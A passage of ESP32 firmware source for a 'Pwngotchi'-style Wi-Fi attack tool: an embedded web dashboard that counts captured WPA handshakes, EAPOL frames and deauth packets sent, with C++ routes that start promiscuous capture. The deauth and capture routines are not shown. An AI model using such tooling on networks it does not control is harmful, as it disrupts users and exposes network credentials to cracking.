    <div class="d-btn" id="dbp" onclick="togglePwn()" title="Power">&#x23FB;</div>
    <div class="d-btn" title="Info" onclick="showInfo()">&#x25B2;</div>
    <div class="d-btn" title="Log">&#x25BC;</div>
  </div>
  <div class="d-front">
    <div class="d-gpio"><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div><div class="d-pin"></div></div>
    <div class="d-leds"><div class="led" id="l0"></div><div class="led" id="l1"></div><div class="led" id="l2"></div></div>
    <div class="d-bezel">
      <div class="eink">
        <div class="e-row"><span id="e-ch">ch:1</span><span id="e-aps">aps:0</span><span id="e-time">00:00:00</span></div>
        <div class="e-fw">
          <div class="e-face" id="eface">(- _ -)</div>
          <div class="e-moodtxt" id="emood">sleeping</div>
          <div class="e-bar" style="width:80%;margin-top:4px"><div class="e-barf" id="e-prog" style="width:0%"></div></div>
        </div>
        <div class="e-row"><span id="e-hs">hs:0</span><span id="e-ep">ep:0</span><span id="e-up">00:00:00</span></div>
        <div class="e-row" style="font-size:9px;color:#3a4a3a"><span id="e-eff">eff: 0.00</span><span id="e-dauth">da:0</span><span id="e-eapol">ea:0</span></div>
      </div>
    </div>
    <div class="d-brand">PHANTOM<span>32</span></div>
    <div class="d-usb"></div>
  </div>
</div>
</div>
<!-- Mood history -->
<div class="mh" id="mh-bar" title="Mood history (oldest→newest)">
  <div class="mhd">?</div><div class="mhd">?</div><div class="mhd">?</div><div class="mhd">?</div>
  <div class="mhd">?</div><div class="mhd">?</div><div class="mhd">?</div><div class="mhd">?</div>
</div>
<!-- Stats -->
<div class="stats">
  <div class="scard act"><div class="sv" id="s-hs">0</div><div class="sl">Handshakes</div></div>
  <div class="scard"><div class="sv" id="s-aps">0</div><div class="sl">APs</div></div>
  <div class="scard"><div class="sv" id="s-cli">0</div><div class="sl">Clients</div></div>
  <div class="scard ok"><div class="sv" id="s-ep">0</div><div class="sl">Epoch</div></div>
</div>
<div class="stats2">
  <div class="scard orn"><div class="sv" id="s-da">0</div><div class="sl">Deauths Sent</div></div>
  <div class="scard"><div class="sv" id="s-ea">0</div><div class="sl">EAPOL Frames</div></div>
</div>
<!-- Controls -->
<div class="ctrl">
  <button class="cbtn cbtn-s" id="cbs" onclick="togglePwn()">&#x25B6; START</button>
  <button class="cbtn cbtn-h" onclick="location.href='/'">&#x2190; Hub</button>
  <button class="cbtn cbtn-p" onclick="exportData()">&#x2193; Export</button>
</div>
<!-- Personality selector -->
<h3>Hunting Style</h3>
<div class="pers">
  <button class="pb" id="pb0" onclick="setPersonality(0)">Balanced</button>
  <button class="pb" id="pb1" onclick="setPersonality(1)">Aggressive</button>
  <button class="pb" id="pb2" onclick="setPersonality(2)">Patient</button>
</div>
<!-- Channel bar -->
<div class="ch-wrap">
  <div class="ch-title">CHANNEL UCB SCORES</div>
  <div class="ch-bar" id="ch-bar"></div>
</div>
<!-- AP Table -->
<h3>Discovered APs (<span id="ap-cnt">0</span>)</h3>
<table class="ap-table" id="ap-table">
  <thead><tr><th>BSSID</th><th>SSID</th><th>CH</th><th>RSSI</th><th>ENC</th><th>EAPOL</th></tr></thead>
  <tbody id="ap-tbody"></tbody>
</table>
<!-- Handshake log -->
<h3>Handshake Log (<span id="hs-cnt">0</span>)</h3>
<div id="hs-log"></div>
<!-- Activity log -->
<div class="log-wrap">
  <div class="log-title">ACTIVITY LOG</div>
  <div id="log"></div>
</div>
<script>
const FACES={sleep:'(- _ -)',bored:'(-__-)',scan:'(. ._)',excited:'(^o^)',happy:'(:D)',pwning:'(>_<)',angry:'(>.<)',confused:'(o.0)',intense:'(==>)',victory:'(^^)'};
const MSGS={sleep:'dreaming of packets...',bored:'nothing here...',scan:'scanning...',excited:'eapol detected!',happy:'handshake captured!',pwning:'pwned.',angry:'deauths failing!',confused:'unexpected traffic',intense:'hunting hard',victory:'victory lap!'};
const ENC_K=['Open','WEP','WPA','WPA2','WPA3'];
const ENC_C=['enc-o','enc-w','enc-w','enc-2','enc-3'];
let g_run=false,g_t0=null,g_lm='',g_pers=0;
const $=id=>document.getElementById(id);
function fmt(ms){if(!ms)return'00:00:00';const s=Math.floor((Date.now()-ms)/1000);return[Math.floor(s/3600),Math.floor((s%3600)/60),s%60].map(n=>n.toString().padStart(2,'0')).join(':');}
function mac2short(m){return m?m.substring(m.length-8):'??:??:??';}

async function tick(){
  try{
    const d=await(await fetch('/api/pwnface/status')).json();
    g_run=!!d.running;
    // E-ink display update
    $('e-ch').textContent='ch:'+d.chan;
    $('e-aps').textContent='aps:'+d.aps;
    $('e-time').textContent=new Date().toLocaleTimeString('en',{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit'});
    const fe=$('eface');
    if(d.mood!==g_lm){
      g_lm=d.mood;fe.classList.add('anim');
      setTimeout(()=>{fe.textContent=FACES[d.mood]||FACES.sleep;fe.classList.remove('anim');},150);
    }
    $('emood').textContent=MSGS[d.mood]||d.mood;
    $('e-hs').textContent='hs:'+d.hs;
    $('e-ep').textContent='ep:'+d.epoch;
    $('e-up').textContent=g_t0?fmt(g_t0):'00:00:00';
    $('e-eff').textContent='eff:'+d.efficiency.toFixed(2);
    $('e-dauth').textContent='da:'+d.deauths;
    $('e-eapol').textContent='ea:'+d.eapol;
    // Progress bar (efficiency 0-1 capped at 1)
    $('e-prog').style.width=Math.min(100,d.efficiency*20).toFixed(0)+'%';
    // LEDs
    $('l0').className='led'+(d.running?' r':'');
    $('l1').className='led'+(d.running&&(d.mood==='happy'||d.mood==='pwning'||d.mood==='victory')?' g':'');
    $('l2').className='led'+(d.running&&d.mood==='excited'?' b':'');
    // Power button
    $('dbp').className='d-btn'+(d.running?' on':'');
    const cb=$('cbs');cb.textContent=d.running?'■ STOP':'▶ START';cb.className='cbtn cbtn-s'+(d.running?' on':'');
    // Stat cards
    $('s-hs').textContent=d.hs;$('s-aps').textContent=d.aps;
    $('s-cli').textContent=d.clients||0;$('s-ep').textContent=d.epoch;
    $('s-da').textContent=d.deauths;$('s-ea').textContent=d.eapol;
    // Channel UCB bar
    if(d.chans&&d.chans.length){
      const mx=Math.max(1,...d.chans.map(c=>c.e||0.001));
      $('ch-bar').innerHTML=d.chans.map(c=>{
        const h=Math.round((c.e||0)/mx*48)||3;
        const a=c.c==d.chan;
        const title='ch'+c.c+': '+c.e+' EAPOL, v:'+c.v+' ucb:'+c.ucb.toFixed(3);
        return'<div class="chb'+(a?' cur':'')+'" title="'+title+'"><div class="chbf" style="height:'+h+'px"></div><span class="chl">'+c.c+'</span></div>';
      }).join('');
    }
    // AP table
    if(d.ap_list&&d.ap_list.length){
      $('ap-cnt').textContent=d.ap_list.length;
      $('ap-tbody').innerHTML=d.ap_list.map(a=>`
        <tr class="${a.active?'active':''}">
          <td>${a.bssid}</td>
          <td style="max-width:90px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${a.ssid}">${a.ssid||'(hidden)'}</td>
          <td>${a.ch}</td>
          <td>${a.rssi}</td>
          <td class="${ENC_C[a.enc]||''}">${ENC_K[a.enc]||'?'}</td>
          <td>${a.eapol}</td>
        </tr>`).join('');
    }
    // Handshake log
    if(d.hs_log&&d.hs_log.length){
      $('hs-cnt').textContent=d.hs_log.length;
      $('hs-log').innerHTML=d.hs_log.slice().reverse().map(h=>`
        <div class="hs-row">
          <div class="hs-mac">${h.ap_short}</div>
          <div class="hs-ssid">${h.ssid||'ch:'+h.ch}</div>
          <div class="hs-cnt">${h.frames} frm</div>
        </div>`).join('');
    }
    // Activity log
    if(d.log&&d.log.length)$('log').innerHTML=d.log.map(l=>'<div class="le">'+escHtml(l)+'</div>').join('');
    // Mood history
    if(d.mood_hist){
      const cells=$('mh-bar').querySelectorAll('.mhd');
      const icons={sleep:'💤',bored:'😑',scan:'👁',excited:'⚡',happy:'😄',pwning:'💀',angry:'😡',confused:'😕',intense:'🔥',victory:'🏆'};
      d.mood_hist.forEach((m,i)=>{if(cells[i]){cells[i].textContent=icons[m]||'?';cells[i].title=m;}});
    }
    // Personality buttons
    ['pb0','pb1','pb2'].forEach((id,i)=>{$(id).className='pb'+(d.personality===i?' active':'');});
    g_pers=d.personality||0;
  }catch(e){}
  setTimeout(tick,2000);
}

function escHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}

async function startPwn(){
  await fetch('/api/pwnface/start?personality='+g_pers,{method:'POST'}).catch(()=>{});
  g_t0=Date.now();tick();
}
async function stopPwn(){
  await fetch('/api/pwnface/stop',{method:'POST'}).catch(()=>{});
  g_t0=null;tick();
}
function togglePwn(){g_run?stopPwn():startPwn();}

function setPersonality(p){
  g_pers=p;
  ['pb0','pb1','pb2'].forEach((id,i)=>{$(id).className='pb'+(i===p?' active':'');});
  if(g_run)fetch('/api/pwnface/personality?p='+p,{method:'POST'}).catch(()=>{});
}

async function exportData(){
  try{
    const d=await(await fetch('/api/pwnface/status')).json();
    const blob=new Blob([JSON.stringify(d,null,2)],{type:'application/json'});
    const a=document.createElement('a');a.href=URL.createObjectURL(blob);
    a.download='pwnface_'+Date.now()+'.json';a.click();
  }catch(e){alert('Export failed: '+e);}
}

function showInfo(){
  alert('Pwngotchi v2\nUCB1-Tuned + Thompson Sampling\nMax APs: 48\nMax Clients: 64\nMax HS Log: 24\n\nPersonalities:\n- Balanced: burst=5, listen=2000ms\n- Aggressive: burst=10, listen=1500ms\n- Patient: burst=3, listen=3500ms');
}

// Init channel bar
$('ch-bar').innerHTML=Array.from({length:13},function(_,i){
  return'<div class="chb"><div class="chbf" style="height:3px"></div><span class="chl">'+(i+1)+'</span></div>';
}).join('');
tick();
</script>
</body></html>)html";

// ── Start / stop ──────────────────────────────────────────────────────────────
void aegisSniff(void*, wifi_promiscuous_pkt_type_t); // forward declaration
static bool pw_start(const String& args) {
  if (pw_running) return false;
  // Parse personality from args
  int p = args.indexOf("personality=");
  if (p >= 0) pw_personality = (uint8_t)args.substring(p+12).toInt();
  else pw_personality = 0;
  // Reset all counters
  pw_hs = 0; pw_total_aps = 0; pw_epoch = 0;
  pw_ap_count = 0; pw_client_count = 0; pw_hs_log_count = 0;
  pw_log_head = 0; pw_log_count = 0; pw_total_visits = 0;
  pw_deauth_total = 0; pw_eapol_total = 0; pw_beacon_total = 0;
  pw_data_total = 0; pw_efficiency = 0.0f;
  pw_mood = PW_SLEEP; pw_uptime_ms = 0;
  memset(pw_mood_hist, 0, sizeof(pw_mood_hist));
  pw_mood_hist_idx = 0;
  for (int i = 0; i < 13; i++) {
    pw_chans[i] = {(uint8_t)(i+1), 0, 0, 0, 0, 0, 0, 0.0f, 1.0f, 1.0f};
  }
  memset(pw_log_buf, 0, sizeof(pw_log_buf));
  memset(pw_aps, 0, sizeof(pw_aps));
  memset(pw_clients, 0, sizeof(pw_clients));
  memset(pw_hs_log, 0, sizeof(pw_hs_log));
  pw_apply_personality();
  if (!pw_mutex) pw_mutex = xSemaphoreCreateMutex();
  wifi_promiscuous_filter_t f = {};
  f.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&f);
  esp_wifi_set_promiscuous_rx_cb(pw_rx);
  esp_wifi_set_promiscuous(true);
  pw_running = true;
  xTaskCreate(pw_run_task, "pwnface", 8192, nullptr, 4, &pw_task);
  return true;
}

static void pw_stop() {
  pw_running = false;
  if (pw_task) { vTaskDelay(pdMS_TO_TICKS(200)); pw_task = nullptr; }
  pw_mood_set(PW_SLEEP);
  pw_log_add("Sleeping. hs=%u aps=%u cli=%u ep=%u",
    (unsigned)pw_hs, (unsigned)pw_total_aps, pw_client_count, (unsigned)pw_epoch);
  esp_wifi_set_promiscuous_rx_cb(aegisSniff);
  wifi_promiscuous_filter_t f = {};
  f.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&f);
  esp_wifi_set_promiscuous(true);
}

// ── Routes ────────────────────────────────────────────────────────────────────
static void pw_routes() {
  extern WebServer server;

  server.on("/pwnface", HTTP_GET, [](){
    server.sendHeader("Cache-Control","no-cache");
    server.send_P(200, "text/html", PW_HTML);
  });

  server.on("/api/pwnface/start", HTTP_POST, [](){
    String q;
    for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}
    bool ok = tool_start("pwnface", q);
    server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");
  });

  server.on("/api/pwnface/stop", HTTP_POST, [](){
    tool_stop("pwnface");
    server.send(200,"application/json","{\"ok\":1}");
  });

  server.on("/api/pwnface/personality", HTTP_POST, [](){
    int p = server.arg("p").toInt();
    if (p >= 0 && p <= 2) { pw_personality = (uint8_t)p; pw_apply_personality(); }
    server.send(200,"application/json","{\"ok\":1}");
  });

  server.on("/api/pwnface/status", HTTP_GET, [](){
    String j = "{";
    j += "\"running\":"    + String(pw_running?1:0);
    j += ",\"mood\":\""    + String(PW_MOOD_K[pw_mood]) + "\"";
    j += ",\"hs\":"        + String(pw_hs);
    j += ",\"aps\":"       + String(pw_total_aps);
    j += ",\"clients\":"   + String(pw_client_count);
    j += ",\"epoch\":"     + String(pw_epoch);
    j += ",\"chan\":"       + String(pw_cur_ch);
    j += ",\"deauths\":"   + String(pw_deauth_total);
    j += ",\"eapol\":"     + String(pw_eapol_total);
    j += ",\"beacons\":"   + String(pw_beacon_total);
    j += ",\"uptime\":"    + String(pw_uptime_ms);
    j += ",\"personality\":" + String(pw_personality);
    j += ",\"efficiency\":" + String(pw_efficiency, 3);
    j += ",\"msg\":\"epoch " + String(pw_epoch) + " | " + String(pw_hs) + " hs | " + String(pw_total_aps) + " APs\"";

    // Per-channel array
    j += ",\"chans\":[";
    for (int i = 0; i < 13; i++) {
      if (i) j += ",";
      j += "{\"c\":" + String(pw_chans[i].ch ? pw_chans[i].ch : (uint8_t)(i+1));
      j += ",\"e\":" + String(pw_chans[i].eapol);
      j += ",\"v\":" + String(pw_chans[i].visits);
      j += ",\"ucb\":" + String(pw_chans[i].ucb_score, 3) + "}";
    }
    j += "]";

    // AP list (up to 20)
    j += ",\"ap_list\":[";
    int shown = 0;
    char mac_str[18];
    for (int i = 0; i < pw_ap_count && shown < 20; i++) {
      if (shown > 0) j += ",";
      pw_mac2str(pw_aps[i].bssid, mac_str);
      j += "{\"bssid\":\"" + String(mac_str) + "\"";
      j += ",\"ssid\":\"";  j += String(pw_aps[i].ssid).substring(0,24); j += "\"";
      j += ",\"ch\":"       + String(pw_aps[i].ch);
      j += ",\"rssi\":"     + String(pw_aps[i].rssi);
      j += ",\"enc\":"      + String(pw_aps[i].enc);
      j += ",\"eapol\":"    + String(pw_aps[i].eapol_seen);
      j += ",\"active\":"   + String(pw_aps[i].active?1:0) + "}";
      shown++;
    }
    j += "]";

    // Handshake log (up to 10 newest)
    j += ",\"hs_log\":[";
    int start = pw_hs_log_count > 10 ? pw_hs_log_count - 10 : 0;
    for (int i = start; i < pw_hs_log_count; i++) {
      if (i > start) j += ",";
      pw_mac2str(pw_hs_log[i].ap, mac_str);
      String ap_short = String(mac_str).substring(9); // last 8 chars
      j += "{\"ap_short\":\"" + ap_short + "\"";
      j += ",\"ssid\":\"";    j += String(pw_hs_log[i].ssid).substring(0,20); j += "\"";
      j += ",\"ch\":"         + String(pw_hs_log[i].ch);
      j += ",\"frames\":"     + String(pw_hs_log[i].frames) + "}";
    }
    j += "]";

    // Mood history
    j += ",\"mood_hist\":[";
    for (int i = 0; i < 8; i++) {
      if (i) j += ",";
      j += "\""; j += PW_MOOD_K[pw_mood_hist[i]]; j += "\"";
    }
    j += "]";

    // Activity log
    j += ",\"log\":[";
    bool first = true;
    for (int i = 0; i < pw_log_count; i++) {
      int idx = ((pw_log_head - 1 - i) + PW_LOG_SZ) % PW_LOG_SZ;
      if (!pw_log_buf[idx][0]) continue;
      if (!first) j += ",";
      j += "\""; j += pw_log_buf[idx]; j += "\"";
      first = false;
    }
    j += "]}";
    server.send(200, "application/json", j);
  });
}
